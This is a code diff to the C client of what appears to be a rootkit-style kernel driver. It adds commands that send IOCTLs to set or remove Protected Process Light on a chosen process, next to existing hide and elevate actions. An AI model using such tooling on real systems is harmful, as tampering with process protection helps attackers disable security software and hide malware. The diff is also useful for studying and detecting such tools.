@@ -186,6 +186,52 @@ int HandleProcessCommand(int argc, char* argv[], char* buffer)
         return 0;
     }
     
+    // Action: --ppl <pid>
+    else if (strcmp(action, "--ppl") == 0) {
+        if (argc < 4) {
+            printf("[!] Missing process name\n");
+            printf("Usage: %s process --ppl <pid>\n", argv[0]);
+            printf("Example: %s process --ppl 123\n", argv[0]);
+            return 1;
+        }
+
+        const char* processPid = argv[3];
+
+        SPY_HIDE_INPUT input = { 0 };
+        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
+        // guard conversion
+        if (!ConversionGuard(processPid)) return 1;
+        // Copy input to start of buffer, output will overwrite
+        memcpy(buffer, &input, sizeof(input));
+        SendIOCTL(IOCTL_SPY_PPL, buffer, sizeof(input), buffer, BUFFER_SIZE);
+        return 0;
+    }
+
+	// action: --unppl <pid>
+    else if (strcmp(action, "--unppl") == 0) {
+        if (argc < 4) {
+            printf("[!] Missing process name\n");
+            printf("Usage: %s process --ppl <pid>\n", argv[0]);
+            printf("Example: %s process --ppl 123\n", argv[0]);
+            return 1;
+        }
+
+        const char* processPid = argv[3];
+
+        SPY_HIDE_INPUT input = { 0 };
+        strncpy_s(input.g_Name, sizeof(input.g_Name), processPid, _TRUNCATE);
+        // guard conversion
+        if (!ConversionGuard(processPid)) return 1;
+        // Copy input to start of buffer, output will overwrite
+        memcpy(buffer, &input, sizeof(input));
+        SendIOCTL(IOCTL_SPY_UNPPL, buffer, sizeof(input), buffer, BUFFER_SIZE);
+        return 0;
+    }
+    else {
+        printf("[!] Unknown process action: %s\n", action);
+        printf("Valid actions: --list, --hide, --elevate, --ppl, --unppl\n");
+        return 1;
+	}
     return 0;
 }
 
